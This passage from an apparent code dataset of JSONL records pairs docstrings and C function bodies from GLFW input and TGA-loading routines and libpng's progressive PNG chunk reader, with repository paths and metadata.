GL_TRUE;\n}", "path": "lib\\glfw\\lib\\x11\\x11_init.c", "repo_name": "AdrienHerubel/imgui", "stars": 223, "license": "None", "language": "c", "size": 854}
{"docstring": "//========================================================================\n// Set callback function for character input\n//========================================================================\n", "func_signal": "GLFWAPI void GLFWAPIENTRY glfwSetCharCallback( GLFWcharfun cbfun )", "code": "{\n    if( !_glfwInitialized || !_glfwWin.opened )\n    {\n        return;\n    }\n\n    // Set callback function\n    _glfwWin.charCallback = cbfun;\n}", "path": "lib\\glfw\\lib\\input.c", "repo_name": "AdrienHerubel/imgui", "stars": 223, "license": "None", "language": "c", "size": 854}
{"docstring": "//========================================================================\n// Read TGA file header (and check that it is valid)\n//========================================================================\n", "func_signal": "static int ReadTGAHeader( _GLFWstream *s, _tga_header_t *h )", "code": "{\n    unsigned char buf[ 18 ];\n    int pos;\n\n    // Read TGA file header from file\n    pos = _glfwTellStream( s );\n    _glfwReadStream( s, buf, 18 );\n\n    // Interpret header (endian independent parsing)\n    h->idlen         = (int) buf[0];\n    h->cmaptype      = (int) buf[1];\n    h->imagetype     = (int) buf[2];\n    h->cmapfirstidx  = (int) buf[3] | (((int) buf[4]) << 8);\n    h->cmaplen       = (int) buf[5] | (((int) buf[6]) << 8);\n    h->cmapentrysize = (int) buf[7];\n    h->xorigin       = (int) buf[8] | (((int) buf[9]) << 8);\n    h->yorigin       = (int) buf[10] | (((int) buf[11]) << 8);\n    h->width         = (int) buf[12] | (((int) buf[13]) << 8);\n    h->height        = (int) buf[14] | (((int) buf[15]) << 8);\n    h->bitsperpixel  = (int) buf[16];\n    h->imageinfo     = (int) buf[17];\n\n    // Extract alphabits and origin information\n    h->_alphabits = (int) (h->imageinfo & _TGA_IMAGEINFO_ALPHA_MASK) >>\n                     _TGA_IMAGEINFO_ALPHA_SHIFT;\n    h->_origin    = (int) (h->imageinfo & _TGA_IMAGEINFO_ORIGIN_MASK) >>\n                     _TGA_IMAGEINFO_ORIGIN_SHIFT;\n\n    // Validate TGA header (is this a TGA file?)\n    if( (h->cmaptype == 0 || h->cmaptype == 1) &&\n        ((h->imagetype >= 1 && h->imagetype <= 3) ||\n         (h->imagetype >= 9 && h->imagetype <= 11)) &&\n         (h->bitsperpixel == 8 || h->bitsperpixel == 24 ||\n          h->bitsperpixel == 32) )\n    {\n        // Skip the ID field\n        _glfwSeekStream( s, h->idlen, SEEK_CUR );\n\n        // Indicate that the TGA header was valid\n        return GL_TRUE;\n    }\n    else\n    {\n        // Restore file position\n        _glfwSeekStream( s, pos, SEEK_SET );\n\n        // Indicate that the TGA header was invalid\n        return GL_FALSE;\n    }\n}", "path": "lib\\glfw\\lib\\tga.c", "repo_name": "AdrienHerubel/imgui", "stars": 223, "license": "None", "language": "c", "size": 854}
{"docstring": "//========================================================================\n// Return mouse button state\n//========================================================================\n", "func_signal": "GLFWAPI int GLFWAPIENTRY glfwGetMouseButton( int button )", "code": "{\n    if( !_glfwInitialized || !_glfwWin.opened )\n    {\n        return GLFW_RELEASE;\n    }\n\n    // Is it a valid mouse button?\n    if( button < 0 || button > GLFW_MOUSE_BUTTON_LAST )\n    {\n        return GLFW_RELEASE;\n    }\n\n    if( _glfwInput.MouseButton[ button ] == GLFW_STICK )\n    {\n        // Sticky mode: release mouse button now\n        _glfwInput.MouseButton[ button ] = GLFW_RELEASE;\n        return GLFW_PRESS;\n    }\n\n    return (int) _glfwInput.MouseButton[ button ];\n}", "path": "lib\\glfw\\lib\\input.c", "repo_name": "AdrienHerubel/imgui", "stars": 223, "license": "None", "language": "c", "size": 854}
{"docstring": "//========================================================================\n// Return mouse wheel position\n//========================================================================\n", "func_signal": "GLFWAPI int GLFWAPIENTRY glfwGetMouseWheel( void )", "code": "{\n    if( !_glfwInitialized || !_glfwWin.opened )\n    {\n        return 0;\n    }\n\n    // Return mouse wheel position\n    return _glfwInput.WheelPos;\n}", "path": "lib\\glfw\\lib\\input.c", "repo_name": "AdrienHerubel/imgui", "stars": 223, "license": "None", "language": "c", "size": 854}
{"docstring": "//========================================================================\n// Set mouse wheel position\n//========================================================================\n", "func_signal": "GLFWAPI void GLFWAPIENTRY glfwSetMouseWheel( int pos )", "code": "{\n    if( !_glfwInitialized || !_glfwWin.opened )\n    {\n        return;\n    }\n\n    // Set mouse wheel position\n    _glfwInput.WheelPos = pos;\n}", "path": "lib\\glfw\\lib\\input.c", "repo_name": "AdrienHerubel/imgui", "stars": 223, "license": "None", "language": "c", "size": 854}
{"docstring": "/* PRIVATE */\n", "func_signal": "png_push_handle_iTXt(png_structp png_ptr, png_infop info_ptr, png_uint_32\n   length)", "code": "{\n   if (!(png_ptr->mode & PNG_HAVE_IHDR) || (png_ptr->mode & PNG_HAVE_IEND))\n      {\n         png_error(png_ptr, \"Out of place iTXt\");\n         info_ptr = info_ptr; /* To quiet some compiler warnings */\n      }\n\n#ifdef PNG_MAX_MALLOC_64K\n   png_ptr->skip_length = 0;  /* This may not be necessary */\n\n   if (length > (png_uint_32)65535L) /* Can't hold entire string in memory */\n   {\n      png_warning(png_ptr, \"iTXt chunk too large to fit in memory\");\n      png_ptr->skip_length = length - (png_uint_32)65535L;\n      length = (png_uint_32)65535L;\n   }\n#endif\n\n   png_ptr->current_text = (png_charp)png_malloc(png_ptr,\n      (png_size_t)(length + 1));\n   png_ptr->current_text[length] = '\\0';\n   png_ptr->current_text_ptr = png_ptr->current_text;\n   png_ptr->current_text_size = (png_size_t)length;\n   png_ptr->current_text_left = (png_size_t)length;\n   png_ptr->process_mode = PNG_READ_iTXt_MODE;\n}", "path": "build\\iphonesdk-utils-2.0\\pngcrush\\libpng\\pngpread.c", "repo_name": "waneck/linux-ios-toolchain", "stars": 163, "license": "None", "language": "c", "size": 13500}
{"docstring": "/* PRIVATE */\n", "func_signal": "png_push_save_buffer(png_structp png_ptr)", "code": "{\n   if (png_ptr->save_buffer_size)\n   {\n      if (png_ptr->save_buffer_ptr != png_ptr->save_buffer)\n      {\n         png_size_t i, istop;\n         png_bytep sp;\n         png_bytep dp;\n\n         istop = png_ptr->save_buffer_size;\n         for (i = 0, sp = png_ptr->save_buffer_ptr, dp = png_ptr->save_buffer;\n            i < istop; i++, sp++, dp++)\n         {\n            *dp = *sp;\n         }\n      }\n   }\n   if (png_ptr->save_buffer_size + png_ptr->current_buffer_size >\n      png_ptr->save_buffer_max)\n   {\n      png_size_t new_max;\n      png_bytep old_buffer;\n\n      if (png_ptr->save_buffer_size > PNG_SIZE_MAX -\n         (png_ptr->current_buffer_size + 256))\n      {\n        png_error(png_ptr, \"Potential overflow of save_buffer\");\n      }\n\n      new_max = png_ptr->save_buffer_size + png_ptr->current_buffer_size + 256;\n      old_buffer = png_ptr->save_buffer;\n      png_ptr->save_buffer = (png_bytep)png_malloc_warn(png_ptr,\n         (png_size_t)new_max);\n      if (png_ptr->save_buffer == NULL)\n      {\n        png_free(png_ptr, old_buffer);\n        png_error(png_ptr, \"Insufficient memory for save_buffer\");\n      }\n      png_memcpy(png_ptr->save_buffer, old_buffer, png_ptr->save_buffer_size);\n      png_free(png_ptr, old_buffer);\n      png_ptr->save_buffer_max = new_max;\n   }\n   if (png_ptr->current_buffer_size)\n   {\n      png_memcpy(png_ptr->save_buffer + png_ptr->save_buffer_size,\n         png_ptr->current_buffer_ptr, png_ptr->current_buffer_size);\n      png_ptr->save_buffer_size += png_ptr->current_buffer_size;\n      png_ptr->current_buffer_size = 0;\n   }\n   png_ptr->save_buffer_ptr = png_ptr->save_buffer;\n   png_ptr->buffer_size = 0;\n}", "path": "build\\iphonesdk-utils-2.0\\pngcrush\\libpng\\pngpread.c", "repo_name": "waneck/linux-ios-toolchain", "stars": 163, "license": "None", "language": "c", "size": 13500}
{"docstring": "/* PRIVATE */\n", "func_signal": "png_push_read_iTXt(png_structp png_ptr, png_infop info_ptr)", "code": "{\n\n   if (png_ptr->buffer_size && png_ptr->current_text_left)\n   {\n      png_size_t text_size;\n\n      if (png_ptr->buffer_size < png_ptr->current_text_left)\n         text_size = png_ptr->buffer_size;\n\n      else\n         text_size = png_ptr->current_text_left;\n\n      png_crc_read(png_ptr, (png_bytep)png_ptr->current_text_ptr, text_size);\n      png_ptr->current_text_left -= text_size;\n      png_ptr->current_text_ptr += text_size;\n   }\n   if (!(png_ptr->current_text_left))\n   {\n      png_textp text_ptr;\n      png_charp key;\n      int comp_flag;\n      png_charp lang;\n      png_charp lang_key;\n      png_charp text;\n      int ret;\n\n      if (png_ptr->buffer_size < 4)\n      {\n         png_push_save_buffer(png_ptr);\n         return;\n      }\n\n      png_push_crc_finish(png_ptr);\n\n#ifdef PNG_MAX_MALLOC_64K\n      if (png_ptr->skip_length)\n         return;\n#endif\n\n      key = png_ptr->current_text;\n\n      for (lang = key; *lang; lang++)\n         /* Empty loop */ ;\n\n      if (lang < key + png_ptr->current_text_size - 3)\n         lang++;\n\n      comp_flag = *lang++;\n      lang++;     /* Skip comp_type, always zero */\n\n      for (lang_key = lang; *lang_key; lang_key++)\n         /* Empty loop */ ;\n\n      lang_key++;        /* Skip NUL separator */\n\n      text=lang_key;\n\n      if (lang_key < key + png_ptr->current_text_size - 1)\n      {\n        for (; *text; text++)\n           /* Empty loop */ ;\n      }\n\n      if (text < key + png_ptr->current_text_size)\n         text++;\n\n      text_ptr = (png_textp)png_malloc(png_ptr,\n         png_sizeof(png_text));\n\n      text_ptr->compression = comp_flag + 2;\n      text_ptr->key = key;\n      text_ptr->lang = lang;\n      text_ptr->lang_key = lang_key;\n      text_ptr->text = text;\n      text_ptr->text_length = 0;\n      text_ptr->itxt_length = png_strlen(text);\n\n      ret = png_set_text_2(png_ptr, info_ptr, text_ptr, 1);\n\n      png_ptr->current_text = NULL;\n\n      png_free(png_ptr, text_ptr);\n      if (ret)\n         png_warning(png_ptr, \"Insufficient memory to store iTXt chunk\");\n   }\n}", "path": "build\\iphonesdk-utils-2.0\\pngcrush\\libpng\\pngpread.c", "repo_name": "waneck/linux-ios-toolchain", "stars": 163, "license": "None", "language": "c", "size": 13500}
{"docstring": "/* PRIVATE */\n", "func_signal": "png_push_restore_buffer(png_structp png_ptr, png_bytep buffer,\n   png_size_t buffer_length)", "code": "{\n   png_ptr->current_buffer = buffer;\n   png_ptr->current_buffer_size = buffer_length;\n   png_ptr->buffer_size = buffer_length + png_ptr->save_buffer_size;\n   png_ptr->current_buffer_ptr = png_ptr->current_buffer;\n}", "path": "build\\iphonesdk-utils-2.0\\pngcrush\\libpng\\pngpread.c", "repo_name": "waneck/linux-ios-toolchain", "stars": 163, "license": "None", "language": "c", "size": 13500}
{"docstring": "/* PRIVATE */\n", "func_signal": "png_process_some_data(png_structp png_ptr, png_infop info_ptr)", "code": "{\n   if (png_ptr == NULL)\n      return;\n\n   switch (png_ptr->process_mode)\n   {\n      case PNG_READ_SIG_MODE:\n      {\n         png_push_read_sig(png_ptr, info_ptr);\n         break;\n      }\n\n      case PNG_READ_CHUNK_MODE:\n      {\n         png_push_read_chunk(png_ptr, info_ptr);\n         break;\n      }\n\n      case PNG_READ_IDAT_MODE:\n      {\n         png_push_read_IDAT(png_ptr);\n         break;\n      }\n\n#ifdef PNG_READ_tEXt_SUPPORTED\n      case PNG_READ_tEXt_MODE:\n      {\n         png_push_read_tEXt(png_ptr, info_ptr);\n         break;\n      }\n\n#endif\n#ifdef PNG_READ_zTXt_SUPPORTED\n      case PNG_READ_zTXt_MODE:\n      {\n         png_push_read_zTXt(png_ptr, info_ptr);\n         break;\n      }\n\n#endif\n#ifdef PNG_READ_iTXt_SUPPORTED\n      case PNG_READ_iTXt_MODE:\n      {\n         png_push_read_iTXt(png_ptr, info_ptr);\n         break;\n      }\n\n#endif\n      case PNG_SKIP_MODE:\n      {\n         png_push_crc_finish(png_ptr);\n         break;\n      }\n\n      default:\n      {\n         png_ptr->buffer_size = 0;\n         break;\n      }\n   }\n}", "path": "build\\iphonesdk-utils-2.0\\pngcrush\\libpng\\pngpread.c", "repo_name": "waneck/linux-ios-toolchain", "stars": 163, "license": "None", "language": "c", "size": 13500}
{"docstring": "/* PRIVATE */\n", "func_signal": "png_push_handle_zTXt(png_structp png_ptr, png_infop info_ptr, png_uint_32\n   length)", "code": "{\n   if (!(png_ptr->mode & PNG_HAVE_IHDR) || (png_ptr->mode & PNG_HAVE_IEND))\n      {\n         png_error(png_ptr, \"Out of place zTXt\");\n         info_ptr = info_ptr; /* To quiet some compiler warnings */\n      }\n\n#ifdef PNG_MAX_MALLOC_64K\n   /* We can't handle zTXt chunks > 64K, since we don't have enough space\n    * to be able to store the uncompressed data.  Actually, the threshold\n    * is probably around 32K, but it isn't as definite as 64K is.\n    */\n   if (length > (png_uint_32)65535L)\n   {\n      png_warning(png_ptr, \"zTXt chunk too large to fit in memory\");\n      png_push_crc_skip(png_ptr, length);\n      return;\n   }\n#endif\n\n   png_ptr->current_text = (png_charp)png_malloc(png_ptr,\n      (png_size_t)(length + 1));\n   png_ptr->current_text[length] = '\\0';\n   png_ptr->current_text_ptr = png_ptr->current_text;\n   png_ptr->current_text_size = (png_size_t)length;\n   png_ptr->current_text_left = (png_size_t)length;\n   png_ptr->process_mode = PNG_READ_zTXt_MODE;\n}", "path": "build\\iphonesdk-utils-2.0\\pngcrush\\libpng\\pngpread.c", "repo_name": "waneck/linux-ios-toolchain", "stars": 163, "license": "None", "language": "c", "size": 13500}
{"docstring": "/* PRIVATE */\n", "func_signal": "png_push_read_chunk(png_structp png_ptr, png_infop info_ptr)", "code": "{\n      PNG_IHDR;\n      PNG_IDAT;\n      PNG_IEND;\n      PNG_PLTE;\n#ifdef PNG_READ_bKGD_SUPPORTED\n      PNG_bKGD;\n#endif\n#ifdef PNG_READ_cHRM_SUPPORTED\n      PNG_cHRM;\n#endif\n#ifdef PNG_READ_gAMA_SUPPORTED\n      PNG_gAMA;\n#endif\n#ifdef PNG_READ_hIST_SUPPORTED\n      PNG_hIST;\n#endif\n#ifdef PNG_READ_iCCP_SUPPORTED\n      PNG_iCCP;\n#endif\n#ifdef PNG_READ_iTXt_SUPPORTED\n      PNG_iTXt;\n#endif\n#ifdef PNG_READ_oFFs_SUPPORTED\n      PNG_oFFs;\n#endif\n#ifdef PNG_READ_pCAL_SUPPORTED\n      PNG_pCAL;\n#endif\n#ifdef PNG_READ_pHYs_SUPPORTED\n      PNG_pHYs;\n#endif\n#ifdef PNG_READ_sBIT_SUPPORTED\n      PNG_sBIT;\n#endif\n#ifdef PNG_READ_sCAL_SUPPORTED\n      PNG_sCAL;\n#endif\n#ifdef PNG_READ_sRGB_SUPPORTED\n      PNG_sRGB;\n#endif\n#ifdef PNG_READ_sPLT_SUPPORTED\n      PNG_sPLT;\n#endif\n#ifdef PNG_READ_tEXt_SUPPORTED\n      PNG_tEXt;\n#endif\n#ifdef PNG_READ_tIME_SUPPORTED\n      PNG_tIME;\n#endif\n#ifdef PNG_READ_tRNS_SUPPORTED\n      PNG_tRNS;\n#endif\n#ifdef PNG_READ_zTXt_SUPPORTED\n      PNG_zTXt;\n#endif\n\n   /* First we make sure we have enough data for the 4 byte chunk name\n    * and the 4 byte chunk length before proceeding with decoding the\n    * chunk data.  To fully decode each of these chunks, we also make\n    * sure we have enough data in the buffer for the 4 byte CRC at the\n    * end of every chunk (except IDAT, which is handled separately).\n    */\n   if (!(png_ptr->mode & PNG_HAVE_CHUNK_HEADER))\n   {\n      png_byte chunk_length[4];\n\n      if (png_ptr->buffer_size < 8)\n      {\n         png_push_save_buffer(png_ptr);\n         return;\n      }\n\n      png_push_fill_buffer(png_ptr, chunk_length, 4);\n      png_ptr->push_length = png_get_uint_31(png_ptr, chunk_length);\n      png_reset_crc(png_ptr);\n      png_crc_read(png_ptr, png_ptr->chunk_name, 4);\n      png_check_chunk_name(png_ptr, png_ptr->chunk_name);\n      png_ptr->mode |= PNG_HAVE_CHUNK_HEADER;\n   }\n\n   if (!png_memcmp(png_ptr->chunk_name, png_IDAT, 4))\n     if (png_ptr->mode & PNG_AFTER_IDAT)\n        png_ptr->mode |= PNG_HAVE_CHUNK_AFTER_IDAT;\n\n   if (!png_memcmp(png_ptr->chunk_name, png_IHDR, 4))\n   {\n      if (png_ptr->push_length != 13)\n         png_error(png_ptr, \"Invalid IHDR length\");\n\n      if (png_ptr->push_length + 4 > png_ptr->buffer_size)\n      {\n         png_push_save_buffer(png_ptr);\n         return;\n      }\n\n      png_handle_IHDR(png_ptr, info_ptr, png_ptr->push_length);\n   }\n\n   else if (!png_memcmp(png_ptr->chunk_name, png_IEND, 4))\n   {\n      if (png_ptr->push_length + 4 > png_ptr->buffer_size)\n      {\n         png_push_save_buffer(png_ptr);\n         return;\n      }\n\n      png_handle_IEND(png_ptr, info_ptr, png_ptr->push_length);\n\n      png_ptr->process_mode = PNG_READ_DONE_MODE;\n      png_push_have_end(png_ptr, info_ptr);\n   }\n\n#ifdef PNG_HANDLE_AS_UNKNOWN_SUPPORTED\n   else if (png_handle_as_unknown(png_ptr, png_ptr->chunk_name))\n   {\n      if (png_ptr->push_length + 4 > png_ptr->buffer_size)\n      {\n         png_push_save_buffer(png_ptr);\n         return;\n      }\n\n      if (!png_memcmp(png_ptr->chunk_name, png_IDAT, 4))\n         png_ptr->mode |= PNG_HAVE_IDAT;\n\n      png_handle_unknown(png_ptr, info_ptr, png_ptr->push_length);\n\n      if (!png_memcmp(png_ptr->chunk_name, png_PLTE, 4))\n         png_ptr->mode |= PNG_HAVE_PLTE;\n\n      else if (!png_memcmp(png_ptr->chunk_name, png_IDAT, 4))\n      {\n         if (!(png_ptr->mode & PNG_HAVE_IHDR))\n            png_error(png_ptr, \"Missing IHDR before IDAT\");\n\n         else if (png_ptr->color_type == PNG_COLOR_TYPE_PALETTE &&\n                  !(png_ptr->mode & PNG_HAVE_PLTE))\n            png_error(png_ptr, \"Missing PLTE before IDAT\");\n      }\n   }\n\n#endif\n   else if (!png_memcmp(png_ptr->chunk_name, png_PLTE, 4))\n   {\n      if (png_ptr->push_length + 4 > png_ptr->buffer_size)\n      {\n         png_push_save_buffer(png_ptr);\n         return;\n      }\n      png_handle_PLTE(png_ptr, info_ptr, png_ptr->push_length);\n   }\n\n   else if (!png_memcmp(png_ptr->chunk_name, png_IDAT, 4))\n   {\n      /* If we reach an IDAT chunk, this means we have read all of the\n       * header chunks, and we can start reading the image (or if this\n       * is called after the image has been read - we have an error).\n       */\n\n      if (!(png_ptr->mode & PNG_HAVE_IHDR))\n         png_error(png_ptr, \"Missing IHDR before IDAT\");\n\n      else if (png_ptr->color_type == PNG_COLOR_TYPE_PALETTE &&\n          !(png_ptr->mode & PNG_HAVE_PLTE))\n         png_error(png_ptr, \"Missing PLTE before IDAT\");\n\n      if (png_ptr->mode & PNG_HAVE_IDAT)\n      {\n         if (!(png_ptr->mode & PNG_HAVE_CHUNK_AFTER_IDAT))\n            if (png_ptr->push_length == 0)\n               return;\n\n         if (png_ptr->mode & PNG_AFTER_IDAT)\n            png_benign_error(png_ptr, \"Too many IDATs found\");\n      }\n\n      png_ptr->idat_size = png_ptr->push_length;\n      png_ptr->mode |= PNG_HAVE_IDAT;\n      png_ptr->process_mode = PNG_READ_IDAT_MODE;\n      png_push_have_info(png_ptr, info_ptr);\n      png_ptr->zstream.avail_out =\n          (uInt) PNG_ROWBYTES(png_ptr->pixel_depth,\n          png_ptr->iwidth) + 1;\n      png_ptr->zstream.next_out = png_ptr->row_buf;\n      return;\n   }\n\n#ifdef PNG_READ_gAMA_SUPPORTED\n   else if (!png_memcmp(png_ptr->chunk_name, png_gAMA, 4))\n   {\n      if (png_ptr->push_length + 4 > png_ptr->buffer_size)\n      {\n         png_push_save_buffer(png_ptr);\n         return;\n      }\n\n      png_handle_gAMA(png_ptr, info_ptr, png_ptr->push_length);\n   }\n\n#endif\n#ifdef PNG_READ_sBIT_SUPPORTED\n   else if (!png_memcmp(png_ptr->chunk_name, png_sBIT, 4))\n   {\n      if (png_ptr->push_length + 4 > png_ptr->buffer_size)\n      {\n         png_push_save_buffer(png_ptr);\n         return;\n      }\n\n      png_handle_sBIT(png_ptr, info_ptr, png_ptr->push_length);\n   }\n\n#endif\n#ifdef PNG_READ_cHRM_SUPPORTED\n   else if (!png_memcmp(png_ptr->chunk_name, png_cHRM, 4))\n   {\n      if (png_ptr->push_length + 4 > png_ptr->buffer_size)\n      {\n         png_push_save_buffer(png_ptr);\n         return;\n      }\n\n      png_handle_cHRM(png_ptr, info_ptr, png_ptr->push_length);\n   }\n\n#endif\n#ifdef PNG_READ_sRGB_SUPPORTED\n   else if (!png_memcmp(png_ptr->chunk_name, png_sRGB, 4))\n   {\n      if (png_ptr->push_length + 4 > png_ptr->buffer_size)\n      {\n         png_push_save_buffer(png_ptr);\n         return;\n      }\n\n      png_handle_sRGB(png_ptr, info_ptr, png_ptr->push_length);\n   }\n\n#endif\n#ifdef PNG_READ_iCCP_SUPPORTED\n   else if (!png_memcmp(png_ptr->chunk_name, png_iCCP, 4))\n   {\n      if (png_ptr->push_length + 4 > png_ptr->buffer_size)\n      {\n         png_push_save_buffer(png_ptr);\n         return;\n      }\n\n      png_handle_iCCP(png_ptr, info_ptr, png_ptr->push_length);\n   }\n\n#endif\n#ifdef PNG_READ_sPLT_SUPPORTED\n   else if (!png_memcmp(png_ptr->chunk_name, png_sPLT, 4))\n   {\n      if (png_ptr->push_length + 4 > png_ptr->buffer_size)\n      {\n         png_push_save_buffer(png_ptr);\n         return;\n      }\n\n      png_handle_sPLT(png_ptr, info_ptr, png_ptr->push_length);\n   }\n\n#endif\n#ifdef PNG_READ_tRNS_SUPPORTED\n   else if (!png_memcmp(png_ptr->chunk_name, png_tRNS, 4))\n   {\n      if (png_ptr->push_length + 4 > png_ptr->buffer_size)\n      {\n         png_push_save_buffer(png_ptr);\n         return;\n      }\n\n      png_handle_tRNS(png_ptr, info_ptr, png_ptr->push_length);\n   }\n\n#endif\n#ifdef PNG_READ_bKGD_SUPPORTED\n   else if (!png_memcmp(png_ptr->chunk_name, png_bKGD, 4))\n   {\n      if (png_ptr->push_length + 4 > png_ptr->buffer_size)\n      {\n         png_push_save_buffer(png_ptr);\n         return;\n      }\n\n      png_handle_bKGD(png_ptr, info_ptr, png_ptr->push_length);\n   }\n\n#endif\n#ifdef PNG_READ_hIST_SUPPORTED\n   else if (!png_memcmp(png_ptr->chunk_name, png_hIST, 4))\n   {\n      if (png_ptr->push_length + 4 > png_ptr->buffer_size)\n      {\n         png_push_save_buffer(png_ptr);\n         return;\n      }\n\n      png_handle_hIST(png_ptr, info_ptr, png_ptr->push_length);\n   }\n\n#endif\n#ifdef PNG_READ_pHYs_SUPPORTED\n   else if (!png_memcmp(png_ptr->chunk_name, png_pHYs, 4))\n   {\n      if (png_ptr->push_length + 4 > png_ptr->buffer_size)\n      {\n         png_push_save_buffer(png_ptr);\n         return;\n      }\n\n      png_handle_pHYs(png_ptr, info_ptr, png_ptr->push_length);\n   }\n\n#endif\n#ifdef PNG_READ_oFFs_SUPPORTED\n   else if (!png_memcmp(png_ptr->chunk_name, png_oFFs, 4))\n   {\n      if (png_ptr->push_length + 4 > png_ptr->buffer_size)\n      {\n         png_push_save_buffer(png_ptr);\n         return;\n      }\n\n      png_handle_oFFs(png_ptr, info_ptr, png_ptr->push_length);\n   }\n#endif\n\n#ifdef PNG_READ_pCAL_SUPPORTED\n   else if (!png_memcmp(png_ptr->chunk_name, png_pCAL, 4))\n   {\n      if (png_ptr->push_length + 4 > png_ptr->buffer_size)\n      {\n         png_push_save_buffer(png_ptr);\n         return;\n      }\n\n      png_handle_pCAL(png_ptr, info_ptr, png_ptr->push_length);\n   }\n\n#endif\n#ifdef PNG_READ_sCAL_SUPPORTED\n   else if (!png_memcmp(png_ptr->chunk_name, png_sCAL, 4))\n   {\n      if (png_ptr->push_length + 4 > png_ptr->buffer_size)\n      {\n         png_push_save_buffer(png_ptr);\n         return;\n      }\n\n      png_handle_sCAL(png_ptr, info_ptr, png_ptr->push_length);\n   }\n\n#endif\n#ifdef PNG_READ_tIME_SUPPORTED\n   else if (!png_memcmp(png_ptr->chunk_name, png_tIME, 4))\n   {\n      if (png_ptr->push_length + 4 > png_ptr->buffer_size)\n      {\n         png_push_save_buffer(png_ptr);\n         return;\n      }\n\n      png_handle_tIME(png_ptr, info_ptr, png_ptr->push_length);\n   }\n\n#endif\n#ifdef PNG_READ_tEXt_SUPPORTED\n   else if (!png_memcmp(png_ptr->chunk_name, png_tEXt, 4))\n   {\n      if (png_ptr->push_length + 4 > png_ptr->buffer_size)\n      {\n         png_push_save_buffer(png_ptr);\n         return;\n      }\n\n      png_push_handle_tEXt(png_ptr, info_ptr, png_ptr->push_length);\n   }\n\n#endif\n#ifdef PNG_READ_zTXt_SUPPORTED\n   else if (!png_memcmp(png_ptr->chunk_name, png_zTXt, 4))\n   {\n      if (png_ptr->push_length + 4 > png_ptr->buffer_size)\n      {\n         png_push_save_buffer(png_ptr);\n         return;\n      }\n\n      png_push_handle_zTXt(png_ptr, info_ptr, png_ptr->push_length);\n   }\n\n#endif\n#ifdef PNG_READ_iTXt_SUPPORTED\n   else if (!png_memcmp(png_ptr->chunk_name, png_iTXt, 4))\n   {\n      if (png_ptr->push_length + 4 > png_ptr->buffer_size)\n      {\n         png_push_save_buffer(png_ptr);\n         return;\n      }\n\n      png_push_handle_iTXt(png_ptr, info_ptr, png_ptr->push_length);\n   }\n\n#endif\n   else\n   {\n      if (png_ptr->push_length + 4 > png_ptr->buffer_size)\n      {\n         png_push_save_buffer(png_ptr);\n         return;\n      }\n      png_push_handle_unknown(png_ptr, info_ptr, png_ptr->push_length);\n   }\n\n   png_ptr->mode &= ~PNG_HAVE_CHUNK_HEADER;\n}", "path": "build\\iphonesdk-utils-2.0\\pngcrush\\libpng\\pngpread.c", "repo_name": "waneck/linux-ios-toolchain", "stars": 163, "license": "None", "language": "c", "size": 13500}
{"docstring": "/* PRIVATE */\n", "func_signal": "png_push_read_tEXt(png_structp png_ptr, png_infop info_ptr)", "code": "{\n   if (png_ptr->buffer_size && png_ptr->current_text_left)\n   {\n      png_size_t text_size;\n\n      if (png_ptr->buffer_size < png_ptr->current_text_left)\n         text_size = png_ptr->buffer_size;\n\n      else\n         text_size = png_ptr->current_text_left;\n\n      png_crc_read(png_ptr, (png_bytep)png_ptr->current_text_ptr, text_size);\n      png_ptr->current_text_left -= text_size;\n      png_ptr->current_text_ptr += text_size;\n   }\n   if (!(png_ptr->current_text_left))\n   {\n      png_textp text_ptr;\n      png_charp text;\n      png_charp key;\n      int ret;\n\n      if (png_ptr->buffer_size < 4)\n      {\n         png_push_save_buffer(png_ptr);\n         return;\n      }\n\n      png_push_crc_finish(png_ptr);\n\n#ifdef PNG_MAX_MALLOC_64K\n      if (png_ptr->skip_length)\n         return;\n#endif\n\n      key = png_ptr->current_text;\n\n      for (text = key; *text; text++)\n         /* Empty loop */ ;\n\n      if (text < key + png_ptr->current_text_size)\n         text++;\n\n      text_ptr = (png_textp)png_malloc(png_ptr,\n         png_sizeof(png_text));\n      text_ptr->compression = PNG_TEXT_COMPRESSION_NONE;\n      text_ptr->key = key;\n#ifdef PNG_iTXt_SUPPORTED\n      text_ptr->lang = NULL;\n      text_ptr->lang_key = NULL;\n#endif\n      text_ptr->text = text;\n\n      ret = png_set_text_2(png_ptr, info_ptr, text_ptr, 1);\n\n      png_free(png_ptr, key);\n      png_free(png_ptr, text_ptr);\n      png_ptr->current_text = NULL;\n\n      if (ret)\n        png_warning(png_ptr, \"Insufficient memory to store text chunk\");\n   }\n}", "path": "build\\iphonesdk-utils-2.0\\pngcrush\\libpng\\pngpread.c", "repo_name": "waneck/linux-ios-toolchain", "stars": 163, "license": "None", "language": "c", "size": 13500}
{"docstring": "/* PRIVATE */\n", "func_signal": "png_read_push_finish_row(png_structp png_ptr)", "code": "{\n   /* Arrays to facilitate easy interlacing - use pass (0 - 6) as index */\n\n   /* Start of interlace block */\n   PNG_CONST int FARDATA png_pass_start[] = {0, 4, 0, 2, 0, 1, 0};\n\n   /* Offset to next interlace block */\n   PNG_CONST int FARDATA png_pass_inc[] = {8, 8, 4, 4, 2, 2, 1};\n\n   /* Start of interlace block in the y direction */\n   PNG_CONST int FARDATA png_pass_ystart[] = {0, 0, 4, 0, 2, 0, 1};\n\n   /* Offset to next interlace block in the y direction */\n   PNG_CONST int FARDATA png_pass_yinc[] = {8, 8, 8, 4, 4, 2, 2};\n\n   /* Height of interlace block.  This is not currently used - if you need\n    * it, uncomment it here and in png.h\n   PNG_CONST int FARDATA png_pass_height[] = {8, 8, 4, 4, 2, 2, 1};\n   */\n\n   png_ptr->row_number++;\n   if (png_ptr->row_number < png_ptr->num_rows)\n      return;\n\n#ifdef PNG_READ_INTERLACING_SUPPORTED\n   if (png_ptr->interlaced)\n   {\n      png_ptr->row_number = 0;\n      png_memset(png_ptr->prev_row, 0,\n         png_ptr->rowbytes + 1);\n      do\n      {\n         png_ptr->pass++;\n         if ((png_ptr->pass == 1 && png_ptr->width < 5) ||\n             (png_ptr->pass == 3 && png_ptr->width < 3) ||\n             (png_ptr->pass == 5 && png_ptr->width < 2))\n           png_ptr->pass++;\n\n         if (png_ptr->pass > 7)\n            png_ptr->pass--;\n\n         if (png_ptr->pass >= 7)\n            break;\n\n         png_ptr->iwidth = (png_ptr->width +\n            png_pass_inc[png_ptr->pass] - 1 -\n            png_pass_start[png_ptr->pass]) /\n            png_pass_inc[png_ptr->pass];\n\n         if (png_ptr->transformations & PNG_INTERLACE)\n            break;\n\n         png_ptr->num_rows = (png_ptr->height +\n            png_pass_yinc[png_ptr->pass] - 1 -\n            png_pass_ystart[png_ptr->pass]) /\n            png_pass_yinc[png_ptr->pass];\n\n      } while (png_ptr->iwidth == 0 || png_ptr->num_rows == 